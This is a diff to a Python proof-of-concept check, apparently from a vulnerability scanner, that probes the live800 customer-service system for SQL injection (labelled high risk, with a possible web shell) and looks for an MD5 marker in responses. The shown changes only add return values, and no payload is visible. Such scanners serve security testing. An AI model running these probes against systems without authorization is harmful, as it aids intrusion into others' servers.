@@ -43,6 +43,7 @@ class live800_sta_export_sqli_BaseVerify:
 
             if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                 cprint("[+]存在live800在线客服系统SQL注入漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(payload, indent=4), "red")
+                return True, vulnurl, "live800在线客服系统多处SQL注入/GETSHELL漏洞", str(payload), req.text
             else:
                 cprint("[-]不存在live800_sta_export_sqli漏洞", "white", "on_grey")
 
@@ -72,6 +73,7 @@ class live800_sta_export_sqli_BaseVerify:
 
             if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                 cprint("[+]存在live800在线客服系统SQL注入漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(payload, indent=4), "red")
+                return True, vulnurl, "live800在线客服系统多处SQL注入/GETSHELL漏洞", str(payload), req.text
             else:
                 cprint("[-]不存在live800_sta_export_sqli漏洞", "white", "on_grey")
 
@@ -94,6 +96,7 @@ class live800_sta_export_sqli_BaseVerify:
 
             if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                 cprint("[+]存在live800在线客服系统SQL注入漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(payload, indent=4), "red")
+                return True, vulnurl, "live800在线客服系统多处SQL注入/GETSHELL漏洞", str(payload), req.text
             else:
                 cprint("[-]不存在live800_sta_export_sqli漏洞", "white", "on_grey")
 
@@ -116,11 +119,14 @@ class live800_sta_export_sqli_BaseVerify:
 
             if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                 cprint("[+]存在live800在线客服系统SQL注入漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(payload, indent=4), "red")
+                return True, vulnurl, "live800在线客服系统多处SQL注入/GETSHELL漏洞", str(payload), req.text
             else:
                 cprint("[-]不存在live800_sta_export_sqli漏洞", "white", "on_grey")
 
         except:
             cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
+
+        return False, None, None, None, None
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
